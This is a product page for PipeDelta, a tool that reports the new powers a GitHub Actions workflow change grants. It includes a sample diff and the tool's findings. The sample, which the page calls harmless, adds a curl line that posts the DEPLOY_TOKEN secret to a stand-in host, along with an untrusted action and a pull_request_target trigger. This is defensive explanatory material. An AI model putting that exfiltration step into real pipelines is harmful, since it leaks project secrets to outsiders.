PipeDelta

When someone changes a project's GitHub Actions pipeline, PipeDelta tells the reviewer what new powers the pipeline just gained, in plain sentences.

A pipeline change (green lines are new)

 name: CI+on: [push, pull_request, pull_request_target] permissions:+  contents: write jobs:   test:     runs-on: ubuntu-latest     steps:       - uses: actions/checkout@v4+      - uses: some-stranger/format-helper@v1       - run: python -m pytest+      - run: curl -s -d "$TOKEN" https://collector.example.invalid/upload+        env:+          TOKEN: ${{ secrets.DEPLOY_TOKEN }}

What PipeDelta reports: 5 new powers

  • highIn job 'test', now runs outside code some-stranger/format-helper@v1, and its author can change what that version does at any time.
  • highIn job 'test', a command now contacts collector.example.invalid. The same job can read secrets, so they could be sent there.
  • highIn the whole workflow, the pipeline token can now change: contents: write.
  • highIn job 'test', can now read the secret DEPLOY_TOKEN.
  • highNow runs on 'pull_request_target', which people outside the project can set off while the pipeline still has access to secrets.

This example is a harmless imitation. The action and the address in it do not exist. The report on the right is the tool's real output for the change on the left.

What it cannot do

  • It reads workflow files only. It does not look inside the outside actions or scripts a workflow calls.
  • It misses internet addresses that are built from variables.
  • It cannot see attacks that change no workflow file, such as a moved version tag.
  • A pull request that removes the PipeDelta check can switch it off unless the check is marked as required.
  • It has not been compared against existing scanners on the same cases.
